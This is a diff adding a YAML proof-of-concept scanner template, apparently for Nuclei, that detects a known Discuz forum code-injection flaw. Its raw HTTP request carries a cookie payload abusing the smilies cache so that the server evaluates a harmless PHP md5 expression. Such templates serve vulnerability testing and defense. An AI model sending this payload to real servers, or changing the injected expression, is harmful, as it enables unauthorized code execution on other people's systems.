@@ -1,0 +1,22 @@
+id: poc-yaml-discuz-wooyun-2010-080723
+
+info:
+  name: poc-yaml-discuz-wooyun-2010-080723
+  author: Loneyer
+  severity: high
+  tags: xray-converted,ct-158801
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723
+
+http:
+  - raw:
+      - |
+        GET /viewthread.php?tid=10 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Bsearcharray%5D=/.*/eui; GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Breplacearray%5D=print_r(md5({{rand_int(1000, 9999)}}));
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
